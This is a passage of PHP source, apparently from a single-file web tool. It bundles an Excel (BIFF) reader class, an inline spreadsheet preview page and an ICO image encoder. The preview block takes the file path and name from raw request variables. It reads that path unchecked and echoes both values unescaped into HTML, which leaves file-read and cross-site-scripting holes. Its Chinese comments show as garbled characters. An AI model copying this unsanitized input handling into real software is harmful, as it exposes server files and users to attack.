Spreadsheet_Excel_Reader($file='',$store_extended_info=true,$outputEncoding='') { $this->_ole =& new OLERead(); $this->setUTFEncoder('iconv'); if ($outputEncoding != '') { $this->setOutputEncoding($outputEncoding); } for ($i=1; $i<245; $i++) { $name = strtolower(( (($i-1)/26>=1)?chr(($i-1)/26+64):'') . chr(($i-1)%26+65)); $this->colnames[$name] = $i; $this->colindexes[$i] = $name; } $this->store_extended_info = $store_extended_info; if ($file!="") { $this->read($file); } } function setOutputEncoding($encoding) { $this->_defaultEncoding = $encoding; } function setUTFEncoder($encoder = 'iconv') { $this->_encoderFunction = ''; if ($encoder == 'iconv') { $this->_encoderFunction = function_exists('iconv') ? 'iconv' : ''; } elseif ($encoder == 'mb') { $this->_encoderFunction = function_exists('mb_convert_encoding') ? 'mb_convert_encoding' : ''; } } function setRowColOffset($iOffset) { $this->_rowoffset = $iOffset; $this->_coloffset = $iOffset; } function setDefaultFormat($sFormat) { $this->_defaultFormat = $sFormat; } function setColumnFormat($column, $sFormat) { $this->_columnsFormat[$column] = $sFormat; } function read($sFileName) { $res = $this->_ole->read($sFileName); if($res === false) { if($this->_ole->error == 1) { die('The filename ' . $sFileName . ' is not readable'); } } $this->data = $this->_ole->getWorkBook(); $this->_parse(); } function _parse() { $pos = 0; $data = $this->data; $code = v($data,$pos); $length = v($data,$pos+2); $version = v($data,$pos+4); $substreamType = v($data,$pos+6); $this->version = $version; if (($version != SPREADSHEET_EXCEL_READER_BIFF8) && ($version != SPREADSHEET_EXCEL_READER_BIFF7)) { return false; } if ($substreamType != SPREADSHEET_EXCEL_READER_WORKBOOKGLOBALS){ return false; } $pos += $length + 4; $code = v($data,$pos); $length = v($data,$pos+2); while ($code != SPREADSHEET_EXCEL_READER_TYPE_EOF) { switch ($code) { case SPREADSHEET_EXCEL_READER_TYPE_SST: $spos = $pos + 4; $limitpos = $spos + $length; $uniqueStrings = $this->_GetInt4d($data, $spos+4); $spos += 8; for ($i = 0; $i < $uniqueStrings; $i++) { if ($spos == $limitpos) { $opcode = v($data,$spos); $conlength = v($data,$spos+2); if ($opcode != 0x3c) { return -1; } $spos += 4; $limitpos = $spos + $conlength; } $numChars = ord($data[$spos]) | (ord($data[$spos+1]) << 8); $spos += 2; $optionFlags = ord($data[$spos]); $spos++; $asciiEncoding = (($optionFlags & 0x01) == 0) ; $extendedString = ( ($optionFlags & 0x04) != 0); $richString = ( ($optionFlags & 0x08) != 0); if ($richString) { $formattingRuns = v($data,$spos); $spos += 2; } if ($extendedString) { $extendedRunLength = $this->_GetInt4d($data, $spos); $spos += 4; } $len = ($asciiEncoding)? $numChars : $numChars*2; if ($spos + $len < $limitpos) { $retstr = substr($data, $spos, $len); $spos += $len; } else{ $retstr = substr($data, $spos, $limitpos - $spos); $bytesRead = $limitpos - $spos; $charsLeft = $numChars - (($asciiEncoding) ? $bytesRead : ($bytesRead / 2)); $spos = $limitpos; while ($charsLeft > 0){ $opcode = v($data,$spos); $conlength = v($data,$spos+2); if ($opcode != 0x3c) { return -1; } $spos += 4; $limitpos = $spos + $conlength; $option = ord($data[$spos]); $spos += 1; if ($asciiEncoding && ($option == 0)) { $len = min($charsLeft, $limitpos - $spos); $retstr .= substr($data, $spos, $len); $charsLeft -= $len; $asciiEncoding = true; } elseif (!$asciiEncoding && ($option != 0)) { $len = min($charsLeft * 2, $limitpos - $spos); $retstr .= substr($data, $spos, $len); $charsLeft -= $len/2; $asciiEncoding = false; } elseif (!$asciiEncoding && ($option == 0)) { $len = min($charsLeft, $limitpos - $spos); for ($j = 0; $j < $len; $j++) { $retstr .= $data[$spos + $j].chr(0); } $charsLeft -= $len; $asciiEncoding = false; } else{ $newstr = ''; for ($j = 0; $j < strlen($retstr); $j++) { $newstr = $retstr[$j].chr(0); } $retstr = $newstr; $len = min($charsLeft * 2, $limitpos - $spos); $retstr .= substr($data, $spos, $len); $charsLeft -= $len/2; $asciiEncoding = false; } $spos += $len; } } $retstr = ($asciiEncoding) ? $retstr : $this->_encodeUTF16($retstr); if ($richString){ $spos += 4 * $formattingRuns; } if ($extendedString) { $spos += $extendedRunLength; } $this->sst[]=$retstr; } break; case SPREADSHEET_EXCEL_READER_TYPE_FILEPASS: return false; break; case SPREADSHEET_EXCEL_READER_TYPE_NAME: break; case SPREADSHEET_EXCEL_READER_TYPE_FORMAT: $indexCode = v($data,$pos+4); if ($version == SPREADSHEET_EXCEL_READER_BIFF8) { $numchars = v($data,$pos+6); if (ord($data[$pos+8]) == 0){ $formatString = substr($data, $pos+9, $numchars); } else { $formatString = substr($data, $pos+9, $numchars*2); } } else { $numchars = ord($data[$pos+6]); $formatString = substr($data, $pos+7, $numchars*2); } $this->formatRecords[$indexCode] = $formatString; break; case SPREADSHEET_EXCEL_READER_TYPE_FONT: $height = v($data,$pos+4); $option = v($data,$pos+6); $color = v($data,$pos+8); $weight = v($data,$pos+10); $under = ord($data[$pos+14]); $font = ""; $numchars = ord($data[$pos+18]); if ((ord($data[$pos+19]) & 1) == 0){ $font = substr($data, $pos+20, $numchars); } else { $font = substr($data, $pos+20, $numchars*2); $font = $this->_encodeUTF16($font); } $this->fontRecords[] = array( 'height' => $height / 20, 'italic' => !!($option & 2), 'color' => $color, 'under' => !($under==0), 'bold' => ($weight==700), 'font' => $font, 'raw' => $this->dumpHexData($data, $pos+3, $length) ); break; case SPREADSHEET_EXCEL_READER_TYPE_PALETTE: $colors = ord($data[$pos+4]) | ord($data[$pos+5]) << 8; for ($coli = 0; $coli < $colors; $coli++) { $colOff = $pos + 2 + ($coli * 4); $colr = ord($data[$colOff]); $colg = ord($data[$colOff+1]); $colb = ord($data[$colOff+2]); $this->colors[0x07 + $coli] = '#' . $this->myhex($colr) . $this->myhex($colg) . $this->myhex($colb); } break; case SPREADSHEET_EXCEL_READER_TYPE_XF: $fontIndexCode = (ord($data[$pos+4]) | ord($data[$pos+5]) << 8) - 1; $fontIndexCode = max(0,$fontIndexCode); $indexCode = ord($data[$pos+6]) | ord($data[$pos+7]) << 8; $alignbit = ord($data[$pos+10]) & 3; $bgi = (ord($data[$pos+22]) | ord($data[$pos+23]) << 8) & 0x3FFF; $bgcolor = ($bgi & 0x7F); $align = ""; if ($alignbit==3) { $align="right"; } if ($alignbit==2) { $align="center"; } $fillPattern = (ord($data[$pos+21]) & 0xFC) >> 2; if ($fillPattern == 0) { $bgcolor = ""; } $xf = array(); $xf['formatIndex'] = $indexCode; $xf['align'] = $align; $xf['fontIndex'] = $fontIndexCode; $xf['bgColor'] = $bgcolor; $xf['fillPattern'] = $fillPattern; $border = ord($data[$pos+14]) | (ord($data[$pos+15]) << 8) | (ord($data[$pos+16]) << 16) | (ord($data[$pos+17]) << 24); $xf['borderLeft'] = $this->lineStyles[($border & 0xF)]; $xf['borderRight'] = $this->lineStyles[($border & 0xF0) >> 4]; $xf['borderTop'] = $this->lineStyles[($border & 0xF00) >> 8]; $xf['borderBottom'] = $this->lineStyles[($border & 0xF000) >> 12]; $xf['borderLeftColor'] = ($border & 0x7F0000) >> 16; $xf['borderRightColor'] = ($border & 0x3F800000) >> 23; $border = (ord($data[$pos+18]) | ord($data[$pos+19]) << 8); $xf['borderTopColor'] = ($border & 0x7F); $xf['borderBottomColor'] = ($border & 0x3F80) >> 7; if (array_key_exists($indexCode, $this->dateFormats)) { $xf['type'] = 'date'; $xf['format'] = $this->dateFormats[$indexCode]; if ($align=='') { $xf['align'] = 'right'; } }elseif (array_key_exists($indexCode, $this->numberFormats)) { $xf['type'] = 'number'; $xf['format'] = $this->numberFormats[$indexCode]; if ($align=='') { $xf['align'] = 'right'; } }else{ $isdate = FALSE; $formatstr = ''; if ($indexCode > 0){ if (isset($this->formatRecords[$indexCode])) $formatstr = $this->formatRecords[$indexCode]; if ($formatstr!="") { $tmp = preg_replace("/\;.*/","",$formatstr); $tmp = preg_replace("/^\[[^\]]*\]/","",$tmp); if (preg_match("/[^hmsday\/\-:\s\\\,AMP]/i", $tmp) == 0) { $isdate = TRUE; $formatstr = $tmp; $formatstr = str_replace(array('AM/PM','mmmm','mmm'), array('a','F','M'), $formatstr); $formatstr = preg_replace("/(h:?)mm?/","$1i", $formatstr); $formatstr = preg_replace("/mm?(:?s)/","i$1", $formatstr); $formatstr = preg_replace("/(^|[^m])m([^m]|$)/", '$1n$2', $formatstr); $formatstr = preg_replace("/(^|[^m])m([^m]|$)/", '$1n$2', $formatstr); $formatstr = str_replace('mm', 'm', $formatstr); $formatstr = preg_replace("/(^|[^d])d([^d]|$)/", '$1j$2', $formatstr); $formatstr = str_replace(array('dddd','ddd','dd','yyyy','yy','hh','h'), array('l','D','d','Y','y','H','g'), $formatstr); $formatstr = preg_replace("/ss?/", 's', $formatstr); } } } if ($isdate){ $xf['type'] = 'date'; $xf['format'] = $formatstr; if ($align=='') { $xf['align'] = 'right'; } }else{ if (preg_match("/[0#]/", $formatstr)) { $xf['type'] = 'number'; if ($align=='') { $xf['align']='right'; } } else { $xf['type'] = 'other'; } $xf['format'] = $formatstr; $xf['code'] = $indexCode; } } $this->xfRecords[] = $xf; break; case SPREADSHEET_EXCEL_READER_TYPE_NINETEENFOUR: $this->nineteenFour = (ord($data[$pos+4]) == 1); break; case SPREADSHEET_EXCEL_READER_TYPE_BOUNDSHEET: $rec_offset = $this->_GetInt4d($data, $pos+4); $rec_typeFlag = ord($data[$pos+8]); $rec_visibilityFlag = ord($data[$pos+9]); $rec_length = ord($data[$pos+10]); if ($version == SPREADSHEET_EXCEL_READER_BIFF8){ $chartype = ord($data[$pos+11]); if ($chartype == 0){ $rec_name = substr($data, $pos+12, $rec_length); } else { $rec_name = $this->_encodeUTF16(substr($data, $pos+12, $rec_length*2)); } }elseif ($version == SPREADSHEET_EXCEL_READER_BIFF7){ $rec_name = substr($data, $pos+11, $rec_length); } $this->boundsheets[] = array('name'=>$rec_name,'offset'=>$rec_offset); break; } $pos += $length + 4; $code = ord($data[$pos]) | ord($data[$pos+1])<<8; $length = ord($data[$pos+2]) | ord($data[$pos+3])<<8; } foreach ($this->boundsheets as $key=>$val){ $this->sn = $key; $this->_parsesheet($val['offset']); } return true; } function _parsesheet($spos) { $cont = true; $data = $this->data; $code = ord($data[$spos]) | ord($data[$spos+1])<<8; $length = ord($data[$spos+2]) | ord($data[$spos+3])<<8; $version = ord($data[$spos + 4]) | ord($data[$spos + 5])<<8; $substreamType = ord($data[$spos + 6]) | ord($data[$spos + 7])<<8; if (($version != SPREADSHEET_EXCEL_READER_BIFF8) && ($version != SPREADSHEET_EXCEL_READER_BIFF7)) { return -1; } if ($substreamType != SPREADSHEET_EXCEL_READER_WORKSHEET){ return -2; } $spos += $length + 4; while($cont) { $lowcode = ord($data[$spos]); if ($lowcode == SPREADSHEET_EXCEL_READER_TYPE_EOF) break; $code = $lowcode | ord($data[$spos+1])<<8; $length = ord($data[$spos+2]) | ord($data[$spos+3])<<8; $spos += 4; $this->sheets[$this->sn]['maxrow'] = $this->_rowoffset - 1; $this->sheets[$this->sn]['maxcol'] = $this->_coloffset - 1; unset($this->rectype); switch ($code) { case SPREADSHEET_EXCEL_READER_TYPE_DIMENSION: if (!isset($this->numRows)) { if (($length == 10) || ($version == SPREADSHEET_EXCEL_READER_BIFF7)){ $this->sheets[$this->sn]['numRows'] = ord($data[$spos+2]) | ord($data[$spos+3]) << 8; $this->sheets[$this->sn]['numCols'] = ord($data[$spos+6]) | ord($data[$spos+7]) << 8; } else { $this->sheets[$this->sn]['numRows'] = ord($data[$spos+4]) | ord($data[$spos+5]) << 8; $this->sheets[$this->sn]['numCols'] = ord($data[$spos+10]) | ord($data[$spos+11]) << 8; } } break; case SPREADSHEET_EXCEL_READER_TYPE_MERGEDCELLS: $cellRanges = ord($data[$spos]) | ord($data[$spos+1])<<8; for ($i = 0; $i < $cellRanges; $i++) { $fr = ord($data[$spos + 8*$i + 2]) | ord($data[$spos + 8*$i + 3])<<8; $lr = ord($data[$spos + 8*$i + 4]) | ord($data[$spos + 8*$i + 5])<<8; $fc = ord($data[$spos + 8*$i + 6]) | ord($data[$spos + 8*$i + 7])<<8; $lc = ord($data[$spos + 8*$i + 8]) | ord($data[$spos + 8*$i + 9])<<8; if ($lr - $fr > 0) { $this->sheets[$this->sn]['cellsInfo'][$fr+1][$fc+1]['rowspan'] = $lr - $fr + 1; } if ($lc - $fc > 0) { $this->sheets[$this->sn]['cellsInfo'][$fr+1][$fc+1]['colspan'] = $lc - $fc + 1; } } break; case SPREADSHEET_EXCEL_READER_TYPE_RK: case SPREADSHEET_EXCEL_READER_TYPE_RK2: $row = ord($data[$spos]) | ord($data[$spos+1])<<8; $column = ord($data[$spos+2]) | ord($data[$spos+3])<<8; $rknum = $this->_GetInt4d($data, $spos + 6); $numValue = $this->_GetIEEE754($rknum); $info = $this->_getCellDetails($spos,$numValue,$column); $this->addcell($row, $column, $info['string'],$info); break; case SPREADSHEET_EXCEL_READER_TYPE_LABELSST: $row = ord($data[$spos]) | ord($data[$spos+1])<<8; $column = ord($data[$spos+2]) | ord($data[$spos+3])<<8; $xfindex = ord($data[$spos+4]) | ord($data[$spos+5])<<8; $index = $this->_GetInt4d($data, $spos + 6); $this->addcell($row, $column, $this->sst[$index], array('xfIndex'=>$xfindex) ); break; case SPREADSHEET_EXCEL_READER_TYPE_MULRK: $row = ord($data[$spos]) | ord($data[$spos+1])<<8; $colFirst = ord($data[$spos+2]) | ord($data[$spos+3])<<8; $colLast = ord($data[$spos + $length - 2]) | ord($data[$spos + $length - 1])<<8; $columns = $colLast - $colFirst + 1; $tmppos = $spos+4; for ($i = 0; $i < $columns; $i++) { $numValue = $this->_GetIEEE754($this->_GetInt4d($data, $tmppos + 2)); $info = $this->_getCellDetails($tmppos-4,$numValue,$colFirst + $i + 1); $tmppos += 6; $this->addcell($row, $colFirst + $i, $info['string'], $info); } break; case SPREADSHEET_EXCEL_READER_TYPE_NUMBER: $row = ord($data[$spos]) | ord($data[$spos+1])<<8; $column = ord($data[$spos+2]) | ord($data[$spos+3])<<8; $tmp = unpack("ddouble", substr($data, $spos + 6, 8)); if ($this->isDate($spos)) { $numValue = $tmp['double']; } else { $numValue = $this->createNumber($spos); } $info = $this->_getCellDetails($spos,$numValue,$column); $this->addcell($row, $column, $info['string'], $info); break; case SPREADSHEET_EXCEL_READER_TYPE_FORMULA: case SPREADSHEET_EXCEL_READER_TYPE_FORMULA2: $row = ord($data[$spos]) | ord($data[$spos+1])<<8; $column = ord($data[$spos+2]) | ord($data[$spos+3])<<8; if ((ord($data[$spos+6])==0) && (ord($data[$spos+12])==255) && (ord($data[$spos+13])==255)) { $previousRow = $row; $previousCol = $column; } elseif ((ord($data[$spos+6])==1) && (ord($data[$spos+12])==255) && (ord($data[$spos+13])==255)) { if (ord($this->data[$spos+8])==1) { $this->addcell($row, $column, "TRUE"); } else { $this->addcell($row, $column, "FALSE"); } } elseif ((ord($data[$spos+6])==2) && (ord($data[$spos+12])==255) && (ord($data[$spos+13])==255)) { } elseif ((ord($data[$spos+6])==3) && (ord($data[$spos+12])==255) && (ord($data[$spos+13])==255)) { $this->addcell($row, $column, ''); } else { $tmp = unpack("ddouble", substr($data, $spos + 6, 8)); if ($this->isDate($spos)) { $numValue = $tmp['double']; } else { $numValue = $this->createNumber($spos); } $info = $this->_getCellDetails($spos,$numValue,$column); $this->addcell($row, $column, $info['string'], $info); } break; case SPREADSHEET_EXCEL_READER_TYPE_BOOLERR: $row = ord($data[$spos]) | ord($data[$spos+1])<<8; $column = ord($data[$spos+2]) | ord($data[$spos+3])<<8; $string = ord($data[$spos+6]); $this->addcell($row, $column, $string); break; case SPREADSHEET_EXCEL_READER_TYPE_STRING: if ($version == SPREADSHEET_EXCEL_READER_BIFF8){ $xpos = $spos; $numChars =ord($data[$xpos]) | (ord($data[$xpos+1]) << 8); $xpos += 2; $optionFlags =ord($data[$xpos]); $xpos++; $asciiEncoding = (($optionFlags &0x01) == 0) ; $extendedString = (($optionFlags & 0x04) != 0); $richString = (($optionFlags & 0x08) != 0); if ($richString) { $formattingRuns =ord($data[$xpos]) | (ord($data[$xpos+1]) << 8); $xpos += 2; } if ($extendedString) { $extendedRunLength =$this->_GetInt4d($this->data, $xpos); $xpos += 4; } $len = ($asciiEncoding)?$numChars : $numChars*2; $retstr =substr($data, $xpos, $len); $xpos += $len; $retstr = ($asciiEncoding)? $retstr : $this->_encodeUTF16($retstr); } elseif ($version == SPREADSHEET_EXCEL_READER_BIFF7){ $xpos = $spos; $numChars =ord($data[$xpos]) | (ord($data[$xpos+1]) << 8); $xpos += 2; $retstr =substr($data, $xpos, $numChars); } $this->addcell($previousRow, $previousCol, $retstr); break; case SPREADSHEET_EXCEL_READER_TYPE_ROW: $row = ord($data[$spos]) | ord($data[$spos+1])<<8; $rowInfo = ord($data[$spos + 6]) | ((ord($data[$spos+7]) << 8) & 0x7FFF); if (($rowInfo & 0x8000) > 0) { $rowHeight = -1; } else { $rowHeight = $rowInfo & 0x7FFF; } $rowHidden = (ord($data[$spos + 12]) & 0x20) >> 5; $this->rowInfo[$this->sn][$row+1] = Array('height' => $rowHeight / 20, 'hidden'=>$rowHidden ); break; case SPREADSHEET_EXCEL_READER_TYPE_DBCELL: break; case SPREADSHEET_EXCEL_READER_TYPE_MULBLANK: $row = ord($data[$spos]) | ord($data[$spos+1])<<8; $column = ord($data[$spos+2]) | ord($data[$spos+3])<<8; $cols = ($length / 2) - 3; for ($c = 0; $c < $cols; $c++) { $xfindex = ord($data[$spos + 4 + ($c * 2)]) | ord($data[$spos + 5 + ($c * 2)])<<8; $this->addcell($row, $column + $c, "", array('xfIndex'=>$xfindex)); } break; case SPREADSHEET_EXCEL_READER_TYPE_LABEL: $row = ord($data[$spos]) | ord($data[$spos+1])<<8; $column = ord($data[$spos+2]) | ord($data[$spos+3])<<8; $this->addcell($row, $column, substr($data, $spos + 8, ord($data[$spos + 6]) | ord($data[$spos + 7])<<8)); break; case SPREADSHEET_EXCEL_READER_TYPE_EOF: $cont = false; break; case SPREADSHEET_EXCEL_READER_TYPE_HYPER: $row = ord($this->data[$spos]) | ord($this->data[$spos+1])<<8; $row2 = ord($this->data[$spos+2]) | ord($this->data[$spos+3])<<8; $column = ord($this->data[$spos+4]) | ord($this->data[$spos+5])<<8; $column2 = ord($this->data[$spos+6]) | ord($this->data[$spos+7])<<8; $linkdata = Array(); $flags = ord($this->data[$spos + 28]); $udesc = ""; $ulink = ""; $uloc = 32; $linkdata['flags'] = $flags; if (($flags & 1) > 0 ) { if (($flags & 0x14) == 0x14 ) { $uloc += 4; $descLen = ord($this->data[$spos + 32]) | ord($this->data[$spos + 33]) << 8; $udesc = substr($this->data, $spos + $uloc, $descLen * 2); $uloc += 2 * $descLen; } $ulink = $this->read16bitstring($this->data, $spos + $uloc + 20); if ($udesc == "") { $udesc = $ulink; } } $linkdata['desc'] = $udesc; $linkdata['link'] = $this->_encodeUTF16($ulink); for ($r=$row; $r<=$row2; $r++) { for ($c=$column; $c<=$column2; $c++) { $this->sheets[$this->sn]['cellsInfo'][$r+1][$c+1]['hyperlink'] = $linkdata; } } break; case SPREADSHEET_EXCEL_READER_TYPE_DEFCOLWIDTH: $this->defaultColWidth = ord($data[$spos+4]) | ord($data[$spos+5]) << 8; break; case SPREADSHEET_EXCEL_READER_TYPE_STANDARDWIDTH: $this->standardColWidth = ord($data[$spos+4]) | ord($data[$spos+5]) << 8; break; case SPREADSHEET_EXCEL_READER_TYPE_COLINFO: $colfrom = ord($data[$spos+0]) | ord($data[$spos+1]) << 8; $colto = ord($data[$spos+2]) | ord($data[$spos+3]) << 8; $cw = ord($data[$spos+4]) | ord($data[$spos+5]) << 8; $cxf = ord($data[$spos+6]) | ord($data[$spos+7]) << 8; $co = ord($data[$spos+8]); for ($coli = $colfrom; $coli <= $colto; $coli++) { $this->colInfo[$this->sn][$coli+1] = Array('width' => $cw, 'xf' => $cxf, 'hidden' => ($co & 0x01), 'collapsed' => ($co & 0x1000) >> 12); } break; default: break; } $spos += $length; } if (!isset($this->sheets[$this->sn]['numRows'])) $this->sheets[$this->sn]['numRows'] = $this->sheets[$this->sn]['maxrow']; if (!isset($this->sheets[$this->sn]['numCols'])) $this->sheets[$this->sn]['numCols'] = $this->sheets[$this->sn]['maxcol']; } function isDate($spos) { $xfindex = ord($this->data[$spos+4]) | ord($this->data[$spos+5]) << 8; return ($this->xfRecords[$xfindex]['type'] == 'date'); } function _getCellDetails($spos,$numValue,$column) { $xfindex = ord($this->data[$spos+4]) | ord($this->data[$spos+5]) << 8; $xfrecord = $this->xfRecords[$xfindex]; $type = $xfrecord['type']; $format = $xfrecord['format']; $formatIndex = $xfrecord['formatIndex']; $fontIndex = $xfrecord['fontIndex']; $formatColor = ""; $rectype = ''; $string = ''; $raw = ''; if (isset($this->_columnsFormat[$column + 1])){ $format = $this->_columnsFormat[$column + 1]; } if ($type == 'date') { $rectype = 'date'; $utcDays = floor($numValue - ($this->nineteenFour ? SPREADSHEET_EXCEL_READER_UTCOFFSETDAYS1904 : SPREADSHEET_EXCEL_READER_UTCOFFSETDAYS)); $utcValue = ($utcDays) * SPREADSHEET_EXCEL_READER_MSINADAY; $dateinfo = gmgetdate($utcValue); $raw = $numValue; $fractionalDay = $numValue - floor($numValue) + .0000001; $totalseconds = floor(SPREADSHEET_EXCEL_READER_MSINADAY * $fractionalDay); $secs = $totalseconds % 60; $totalseconds -= $secs; $hours = floor($totalseconds / (60 * 60)); $mins = floor($totalseconds / 60) % 60; $string = date ($format, mktime($hours, $mins, $secs, $dateinfo["mon"], $dateinfo["mday"], $dateinfo["year"])); } else if ($type == 'number') { $rectype = 'number'; $formatted = $this->_format_value($format, $numValue, $formatIndex); $string = $formatted['string']; $formatColor = $formatted['formatColor']; $raw = $numValue; } else{ if ($format=="") { $format = $this->_defaultFormat; } $rectype = 'unknown'; $formatted = $this->_format_value($format, $numValue, $formatIndex); $string = $formatted['string']; $formatColor = $formatted['formatColor']; $raw = $numValue; } return array( 'string'=>$string, 'raw'=>$raw, 'rectype'=>$rectype, 'format'=>$format, 'formatIndex'=>$formatIndex, 'fontIndex'=>$fontIndex, 'formatColor'=>$formatColor, 'xfIndex'=>$xfindex ); } function createNumber($spos) { $rknumhigh = $this->_GetInt4d($this->data, $spos + 10); $rknumlow = $this->_GetInt4d($this->data, $spos + 6); $sign = ($rknumhigh & 0x80000000) >> 31; $exp = ($rknumhigh & 0x7ff00000) >> 20; $mantissa = (0x100000 | ($rknumhigh & 0x000fffff)); $mantissalow1 = ($rknumlow & 0x80000000) >> 31; $mantissalow2 = ($rknumlow & 0x7fffffff); $value = $mantissa / pow( 2 , (20- ($exp - 1023))); if ($mantissalow1 != 0) $value += 1 / pow (2 , (21 - ($exp - 1023))); $value += $mantissalow2 / pow (2 , (52 - ($exp - 1023))); if ($sign) {$value = -1 * $value;} return $value; } function addcell($row, $col, $string, $info=null) { $this->sheets[$this->sn]['maxrow'] = max($this->sheets[$this->sn]['maxrow'], $row + $this->_rowoffset); $this->sheets[$this->sn]['maxcol'] = max($this->sheets[$this->sn]['maxcol'], $col + $this->_coloffset); $this->sheets[$this->sn]['cells'][$row + $this->_rowoffset][$col + $this->_coloffset] = $string; if ($this->store_extended_info && $info) { foreach ($info as $key=>$val) { $this->sheets[$this->sn]['cellsInfo'][$row + $this->_rowoffset][$col + $this->_coloffset][$key] = $val; } } } function _GetIEEE754($rknum) { if (($rknum & 0x02) != 0) { $value = $rknum >> 2; } else { $sign = ($rknum & 0x80000000) >> 31; $exp = ($rknum & 0x7ff00000) >> 20; $mantissa = (0x100000 | ($rknum & 0x000ffffc)); $value = $mantissa / pow( 2 , (20- ($exp - 1023))); if ($sign) { $value = -1 * $value; } } if (($rknum & 0x01) != 0) { $value /= 100; } return $value; } function _encodeUTF16($string) { $result = $string; if ($this->_defaultEncoding){ switch ($this->_encoderFunction){ case 'iconv' : $result = iconv('UTF-16LE', $this->_defaultEncoding, $string); break; case 'mb_convert_encoding' : $result = mb_convert_encoding($string, $this->_defaultEncoding, 'UTF-16LE' ); break; } } return $result; } function _GetInt4d($data, $pos) { $value = ord($data[$pos]) | (ord($data[$pos+1]) << 8) | (ord($data[$pos+2]) << 16) | (ord($data[$pos+3]) << 24); if ($value>=4294967294) { $value=-2; } return $value; } } 
//����
if($excel=="yes"){
error_reporting(E_ALL ^ E_NOTICE);
$data = new Spreadsheet_Excel_Reader($file,true,"GB2312");
?>
<html>
<head>
<title>Ԥ��:<?=$filename?></title>
<style>
table.excel {
	border-style:ridge;
	border-width:1;
	border-collapse:collapse;
	font-family:sans-serif;
	font-size:12px;
}
table.excel thead th, table.excel tbody th {
	background:#CCCCCC;
	border-style:ridge;
	border-width:1;
	text-align: center;
	vertical-align:bottom;
}
table.excel tbody th {
	text-align:center;
	width:20px;
}
table.excel tbody td {
	vertical-align:bottom;
}
table.excel tbody td {
    padding: 0 3px;
	border: 1px solid #EEEEEE;
}
</style>
</head>

<body>

������: <? 
 for($i=0;$i<=count($data->boundsheets)-1;$i++) {
?>
<a href="?excel=yes&file=<?=$file?>&filename=<?=$filename?>&gzb=<?=$i?>"><?=$data->boundsheets[$i]['name']?></a>  
<?
}

if($gzb==""){
$gzb=0;
}
echo $data->dump(true,true,$gzb); 
?>
</body>
</html>
<?
die();
}
//-------ICO ��-----------------------------
class phpthumb_ico { 
    function phpthumb_ico() { 
        return true; 
    } 
    function GD2ICOstring(&$gd_image_array) { 
        foreach ($gd_image_array as $key => $gd_image) { 
            $ImageWidths[$key]  = ImageSX($gd_image); 
            $ImageHeights[$key] = ImageSY($gd_image); 
            $bpp[$key]          = ImageIsTrueColor($gd_image) ? 32 : 24; 
            $totalcolors[$key]  = ImageColorsTotal($gd_image); 
            $icXOR[$key] = ''; 
            for ($y = $ImageHeights[$key] - 1; $y >= 0; $y--) { 
                for ($x = 0; $x < $ImageWidths[$key]; $x++) { 
                    $argb = $this->GetPixelColor($gd_image, $x, $y); 
                    $a = round(255 * ((127 - $argb['alpha']) / 127)); 
                    $r = $argb['red']; 
                    $g = $argb['green']; 
                    $b = $argb['blue']; 
                    if ($bpp[$key] == 32) { 
                        $icXOR[$key] .= chr($b).chr($g).chr($r).chr($a); 
                    } elseif ($bpp[$key] == 24) { 
                        $icXOR[$key] .= chr($b).chr($g).chr($r); 
                    } 
                    if ($a < 128) { 
                        @$icANDmask[$key][$y] .= '1'; 
                    } else { 
                        @$icANDmask[$key][$y] .= '0'; 
                    } 
                } 
                // mask bits are 32-bit aligned per scanline 
                while (strlen($icANDmask[$key][$y]) % 32) { 
                    $icANDmask[$key][$y] .= '0'; 
                } 
            } 
            $icAND[$key] = ''; 
            foreach ($icANDmask[$key] as $y => $scanlinemaskbits) { 
                for ($i = 0; $i < strlen($scanlinemaskbits); $i += 8) { 
                    $icAND[$key] .= chr(bindec(str_pad(substr($scanlinemaskbits, $i, 8), 8, '0', STR_PAD_LEFT))); 
                } 
            } 
        } 
        foreach ($gd_image_array as $key => $gd_image) { 
            $biSizeImage = $ImageWidths[$key] * $ImageHeights[$key] * ($bpp[$key] / 8); 
            // BITMAPINFOHEADER - 40 bytes 
            $BitmapInfoHeader[$key]  = ''; 
            $BitmapInfoHeader[$key] .= "\x28\x00\x00\x00";                              // DWORD  biSize; 
            $BitmapInfoHeader[$key] .= $this->LittleEndian2String($ImageWidths[$key], 4);      // LONG   biWidth; 
            // The biHeight member specifies the combined 
            // height of the XOR and AND masks. 
            $BitmapInfoHeader[$key] .= $this->LittleEndian2String($ImageHeights[$key] * 2, 4); // LONG   biHeight; 
            $BitmapInfoHeader[$key] .= "\x01\x00";                                      // WORD   biPlanes; 
               $BitmapInfoHeader[$key] .= chr($bpp[$key])."\x00";                          // wBitCount; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // DWORD  biCompression; 
            $BitmapInfoHeader[$key] .= $this->LittleEndian2String($biSizeImage, 4);            // DWORD  biSizeImage; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // LONG   biXPelsPerMeter; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // LONG   biYPelsPerMeter; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // DWORD  biClrUsed; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // DWORD  biClrImportant; 
        } 
        $icondata  = "\x00\x00";                                      // idReserved;   // Reserved (must be 0) 
        $icondata .= "\x01\x00";                                      // idType;       // Resource Type (1 for icons) 
        $icondata .= $this->LittleEndian2String(count($gd_image_array), 2);  // idCount;      // How many images? 
        $dwImageOffset = 6 + (count($gd_image_array) * 16); 
        foreach ($gd_image_array as $key => $gd_image) { 
            // ICONDIRENTRY   idEntries[1]; // An entry for each image (idCount of 'em) 
            $icondata .= chr($ImageWidths[$key]);                     // bWidth;          // Width, in pixels, of the image 
            $icondata .= chr($ImageHeights[$key]);                    // bHeight;         // Height, in pixels, of the image 
            $icondata .= chr($totalcolors[$key]);                     // bColorCount;     // Number of colors in image (0 if >=8bpp) 
            $icondata .= "\x00";                                      // bReserved;       // Reserved ( must be 0) 
            $icondata .= "\x01\x00";                                  // wPlanes;         // Color Planes 
            $icondata .= chr($bpp[$key])."\x00";                      // wBitCount;       // Bits per pixel 
            $dwBytesInRes = 40 + strlen($icXOR[$key]) + strlen($icAND[$key]); 
            $icondata .= $this->LittleEndian2String($dwBytesInRes, 4);       // dwBytesInRes;    // How many bytes in this resource? 
            $icondata .= $this->LittleEndian2String($dwImageOffset, 4);      // dwImageOffset;   // Where in the file is this image? 
            $dwImageOffset += strlen($BitmapInfoHeader[$key]); 
            $dwImageOffset += strlen($icXOR[$key]); 
            $dwImageOffset += strlen($icAND[$key]); 
        } 
